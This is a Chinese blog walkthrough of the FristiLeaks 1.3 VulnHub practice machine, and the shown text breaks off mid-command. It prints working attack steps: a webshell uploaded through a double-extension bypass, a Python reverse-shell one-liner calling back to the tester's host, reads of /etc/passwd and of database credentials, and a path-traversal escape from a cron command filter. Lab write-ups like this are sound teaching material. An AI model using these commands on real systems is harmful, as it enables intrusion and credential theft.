@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"rerestst.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文内容纯属虚构，B站攻略鸭求关注点赞支持！ 测试机地址：192.168.31.196 根据靶机描述将MAC地址配置为08:00:27:A5:A6:76，开机后得到靶机地址：192.168.31.123 （配置虚拟机的MAC地址方法：虚拟机设置-&gt;网络适配器-&gt;高级-&gt;MAC地址）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【攻略鸭】FristiLeaks 1.3_VulnHub靶机攻">
+<meta property="og:url" content="https://rerestst.github.io/2022/02/10/%E3%80%90%E6%94%BB%E7%95%A5%E9%B8%AD%E3%80%91FristiLeaks1.3_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/index.html">
+<meta property="og:site_name" content="rerestst&#39;s blog">
+<meta property="og:description" content="本文内容纯属虚构，B站攻略鸭求关注点赞支持！ 测试机地址：192.168.31.196 根据靶机描述将MAC地址配置为08:00:27:A5:A6:76，开机后得到靶机地址：192.168.31.123 （配置虚拟机的MAC地址方法：虚拟机设置-&gt;网络适配器-&gt;高级-&gt;MAC地址）">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-02-10T01:55:44.000Z">
+<meta property="article:modified_time" content="2023-02-20T05:28:37.411Z">
+<meta property="article:author" content="rerestst">
+<meta property="article:tag" content="VulnHub">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://rerestst.github.io/2022/02/10/%E3%80%90%E6%94%BB%E7%95%A5%E9%B8%AD%E3%80%91FristiLeaks1.3_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://rerestst.github.io/2022/02/10/%E3%80%90%E6%94%BB%E7%95%A5%E9%B8%AD%E3%80%91FristiLeaks1.3_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/","path":"2022/02/10/【攻略鸭】FristiLeaks1.3_VulnHub靶机攻略/","title":"【攻略鸭】FristiLeaks 1.3_VulnHub靶机攻"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>【攻略鸭】FristiLeaks 1.3_VulnHub靶机攻 | rerestst's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">rerestst's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">3</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">10</span></a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">外部信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.0.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="nav-number">1.0.2.</span> <span class="nav-text">80端口</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.0.3.</span> <span class="nav-text">目录枚举</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9A%90%E5%86%99%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">2.0.1.</span> <span class="nav-text">隐写信息泄露</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">2.0.2.</span> <span class="nav-text">文件上传</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">3.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A5apache%E7%94%A8%E6%88%B7%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="nav-number">3.1.</span> <span class="nav-text">以apache用户收集信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="nav-number">3.2.</span> <span class="nav-text">SUID提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="nav-number">3.3.</span> <span class="nav-text">内核提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96"><span class="nav-number">4.</span> <span class="nav-text">其他</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rerestst"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">rerestst</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://rerestst.github.io/2022/02/10/%E3%80%90%E6%94%BB%E7%95%A5%E9%B8%AD%E3%80%91FristiLeaks1.3_VulnHub%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rerestst">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="rerestst's blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="【攻略鸭】FristiLeaks 1.3_VulnHub靶机攻 | rerestst's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【攻略鸭】FristiLeaks 1.3_VulnHub靶机攻
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-02-10 09:55:44" itemprop="dateCreated datePublished" datetime="2022-02-10T09:55:44+08:00">2022-02-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2023-02-20 13:28:37" itemprop="dateModified" datetime="2023-02-20T13:28:37+08:00">2023-02-20</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" itemprop="url" rel="index"><span itemprop="name">靶机攻略</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>本文内容纯属虚构，B站攻略鸭求关注点赞支持！</p>
+<p>测试机地址：192.168.31.196</p>
+<p>根据靶机描述将MAC地址配置为08:00:27:A5:A6:76，开机后得到靶机地址：192.168.31.123</p>
+<p>（配置虚拟机的MAC地址方法：虚拟机设置-&gt;网络适配器-&gt;高级-&gt;MAC地址）</p>
+<span id="more"></span>
+
+<h3 id="外部信息收集"><a href="#外部信息收集" class="headerlink" title="外部信息收集"></a>外部信息收集</h3><h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>Nmap结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">80/tcp open  Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</span><br><span class="line">|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</span><br><span class="line">robots.txt：/cola /sisi /beer</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: GET HEAD POST OPTIONS TRACE</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br></pre></td></tr></table></figure>
+
+<h5 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h5><p>页面源代码没敏感内容</p>
+<p>打开三个目录后页面源代码中只有地址&#x2F;images&#x2F;3037440.jpg</p>
+<h5 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.123/FUZZ</span><br></pre></td></tr></table></figure>
+<p>没内容</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h5 id="隐写信息泄露"><a href="#隐写信息泄露" class="headerlink" title="隐写信息泄露"></a>隐写信息泄露</h5><p>看别人博客发现&#x2F;fristi&#x2F;有个登录框</p>
+<p>页面源代码的注释中发现用户名eezeepz和</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- </span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx</span><br><span class="line">jwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0kl</span><br><span class="line">S0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixw</span><br><span class="line">B4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+f</span><br><span class="line">m63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJ</span><br><span class="line">Zv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvb</span><br><span class="line">DpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNd</span><br><span class="line">jJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU</span><br><span class="line">12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5</span><br><span class="line">uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg1</span><br><span class="line">04VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLq</span><br><span class="line">i1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2Fg</span><br><span class="line">tOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws</span><br><span class="line">30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl</span><br><span class="line">3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HK</span><br><span class="line">ul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12q</span><br><span class="line">mD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34</span><br><span class="line">rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFhe</span><br><span class="line">EPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLH</span><br><span class="line">AHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzk</span><br><span class="line">CwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJR</span><br><span class="line">U5ErkJggg==</span><br><span class="line">--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>解析base64编码的图片得到字符串keKkeKKeKKeKkEkkEk</p>
+<p>测试登录框：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.31.123/fristi/checklogin.php">http://192.168.31.123/fristi/checklogin.php</a></p>
+<p>POST &#x2F;fristi&#x2F;checklogin.php HTTP&#x2F;1.1</p>
+<p>myusername&#x3D;test1&amp;mypassword&#x3D;test2&amp;Submit&#x3D;Login</p>
+<p>返回</p>
+<p>Wrong Username or Password</p>
+<p>未发现登录失败处理，尝试账号枚举失败</p>
+<p>尝试eezeepz:keKkeKKeKKeKkEkkEk登录成功，发现有上传图片功能。</p>
+<h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><p>提交正常图片white-wolf-wizard.jpg后，返回说文件提交到了&#x2F;uploads</p>
+<p>尝试访问<a target="_blank" rel="noopener" href="http://192.168.31.123/fristi/uploads/%EF%BC%8C%E8%BF%94%E5%9B%9Eno">http://192.168.31.123/fristi/uploads/，返回no</a></p>
+<p>访问white-wolf-wizard.jpg</p>
+<p>上传冰蝎马，提示只可以png,jpg,gif</p>
+<p>已知服务器中间件版本，尝试上传<a target="_blank" rel="noopener" href="http://192.168.31.123/fristi/uploads/shell.php.jpg%E6%88%90%E5%8A%9F">http://192.168.31.123/fristi/uploads/shell.php.jpg成功</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;id</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br></pre></td></tr></table></figure>
+
+<p>测试机端nc -nvlp 443，冰蝎命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.196&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line">成功</span><br><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">echo $-</span><br></pre></td></tr></table></figure>
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h4 id="以apache用户收集信息"><a href="#以apache用户收集信息" class="headerlink" title="以apache用户收集信息"></a>以apache用户收集信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">eezeepz:x:500:500::/home/eezeepz:/bin/bash</span><br><span class="line">admin:x:501:501::/home/admin:/bin/bash</span><br><span class="line">fristigod:x:502:502::/var/fristigod:/bin/bash</span><br><span class="line">fristi:x:503:100::/var/www:/sbin/nologin</span><br><span class="line"></span><br><span class="line">OS: Linux version 2.6.32-573.8.1.el6.x86_64 (mockbuild@c6b8.bsys.dev.centos.org)</span><br><span class="line">(gcc version 4.4.7 20120313 (Red Hat 4.4.7-16) (GCC) ) #1 SMP Tue Nov 10 18:01:38 UTC 2015</span><br><span class="line">gcc.x86_64    4.4.7-16.el6</span><br></pre></td></tr></table></figure>
+
+<p>查看计划任务：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">ls -al /etc/cron*</span><br><span class="line"></span><br><span class="line">/etc/cron.d/0hourly:</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line">HOME=/</span><br><span class="line">01 * * * * root run-parts /etc/cron.hourly</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/etc/cron.hourly/0anacron:</span><br><span class="line">cat /etc/cron.hourly/0anacron</span><br><span class="line">#!/bin/bash</span><br><span class="line"># Skip excecution unless the date has changed from the previous run </span><br><span class="line">if test -r /var/spool/anacron/cron.daily; then</span><br><span class="line">    day=`cat /var/spool/anacron/cron.daily`</span><br><span class="line">fi</span><br><span class="line">if [ `date +%Y%m%d` = &quot;$day&quot; ]; then</span><br><span class="line">    exit 0;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># Skip excecution unless AC powered</span><br><span class="line">if test -x /usr/bin/on_ac_power; then</span><br><span class="line">    /usr/bin/on_ac_power &amp;&gt; /dev/null</span><br><span class="line">    if test $? -eq 1; then</span><br><span class="line">    exit 0</span><br><span class="line">    fi</span><br><span class="line">fi</span><br><span class="line">/usr/sbin/anacron -s</span><br><span class="line"></span><br><span class="line">ls -al /usr/sbin/anacron</span><br><span class="line">-rwxr-xr-x. 1 root root 38968 Nov 10  2015 /usr/sbin/anacron</span><br><span class="line"></span><br><span class="line">/var/spool/anacron:</span><br><span class="line">-rw-------. 1 root root    9 Dec  5 05:22 cron.daily</span><br><span class="line">-rw-------. 1 root root    9 Dec  5 06:02 cron.monthly</span><br><span class="line">-rw-------. 1 root root    9 Dec  5 05:42 cron.weekly</span><br><span class="line">无内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls -al /var/spool/cron</span><br><span class="line">-rw-------  1 admin    admin   49 Nov 18  2015 admin</span><br><span class="line">无权限</span><br></pre></td></tr></table></figure>
+
+
+<p>Sudo version 1.8.6p3</p>
+<p>SELinux status:disabled</p>
+<p>mysql  Ver 14.14 Distrib 5.1.73</p>
+<p>数据库：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/html/fristi/checklogin.php</span><br><span class="line">$host=&quot;localhost&quot;</span><br><span class="line">$username=&quot;eezeepz&quot;; // Mysql username</span><br><span class="line">$password=&quot;4ll3maal12#&quot;; // Mysql password</span><br><span class="line">$db_name=&quot;hackmenow&quot;; // Database name</span><br><span class="line">$tbl_name=&quot;members&quot;; // Table name</span><br><span class="line"></span><br><span class="line">mysql -h localhost -u eezeepz -p 4ll3maal12</span><br><span class="line">登录失败</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>查邮件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al /var/mail/</span><br><span class="line">ls -al /var/spool/mail/</span><br></pre></td></tr></table></figure>
+<p>无权限且大小都为0</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/notes.txt</span><br><span class="line">hey eezeepz your homedir is a mess, go clean it up, just dont delete</span><br><span class="line">the important stuff.</span><br><span class="line">-jerry</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/home/eezeepz</span><br><span class="line">ls -al</span><br><span class="line">...</span><br><span class="line">-r--r--r--. 1 eezeepz eezeepz    514 Nov 18  2015 notes.txt</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">cat notes.txt</span><br><span class="line">Yo EZ,</span><br><span class="line"></span><br><span class="line">I made it possible for you to do some automated checks, </span><br><span class="line">but I did only allow you access to /usr/bin/* system binaries. I did</span><br><span class="line">however copy a few extra often needed commands to my </span><br><span class="line">homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those</span><br><span class="line">from /home/admin/</span><br><span class="line"></span><br><span class="line">Don&#x27;t forget to specify the full path for each binary!</span><br><span class="line"></span><br><span class="line">Just put a file called &quot;runthis&quot; in /tmp/, each line one command. The </span><br><span class="line">output goes to the file &quot;cronresult&quot; in /tmp/. It should </span><br><span class="line">run every minute with my account privileges.</span><br><span class="line"></span><br><span class="line">\- Jerry</span><br></pre></td></tr></table></figure>
+<p>注意到在&#x2F;tmp&#x2F;下创建runthis，会以admin用户运行</p>
+<h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>尝试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;chmod -R 777 /home/admin&quot; &gt;/tmp/runthis无法执行</span><br><span class="line">echo &quot;/bin/chmod -R 477 /home/admin&quot; &gt;/tmp/runthis无法执行</span><br><span class="line">返回：command did not start with /home/admin or /usr/bin</span><br><span class="line"></span><br><span class="line">echo &quot;/usr/bin/../../bin/chmod -R 777 /home/admin&quot; &gt;/tmp/runthis可以执行</span><br><span class="line">(/usr/bin/下面没有chmod)</span><br></pre></td></tr></table></figure>
+<p>找哪些属于admin的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">find / -user admin 